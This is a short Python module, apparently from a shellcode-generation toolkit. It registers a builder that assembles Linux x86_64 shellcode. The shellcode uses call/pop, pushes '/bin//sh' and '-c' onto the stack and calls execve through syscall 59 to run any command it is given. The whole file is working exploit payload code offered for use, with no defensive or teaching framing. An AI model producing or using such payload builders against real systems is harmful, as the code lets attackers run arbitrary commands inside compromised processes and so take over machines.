"""Linux x86_64 — execve("/bin/sh", ["/bin/sh", "-c", cmd], NULL) via syscall.

Technique:
  call/pop to recover cmd string address in a position-independent way.
  Builds "/bin//sh" and "-c" strings on the stack, constructs argv[] array,
  then issues SYS_execve (59).
"""
from __future__ import annotations

from .._asm import assemble
from . import register

_TEMPLATE = """\
jmp get_str

exec:
pop r8

xor rax, rax
push rax
mov rbx, 0x68732f2f6e69622f
push rbx
mov rdi, rsp

push rax
mov word ptr [rsp], 0x632d
mov rcx, rsp

push rax
push r8
push rcx
push rdi
mov rsi, rsp

xor rdx, rdx
mov rax, 59
syscall

get_str:
call exec
"""


@register("linux", "x64")
def build(cmd: str) -> bytes:
    """Assemble Linux x64 execve shellcode for the given command string."""
    code = assemble(_TEMPLATE, arch="x86", mode="64")
    return code + cmd.encode("latin-1") + b"\x00"
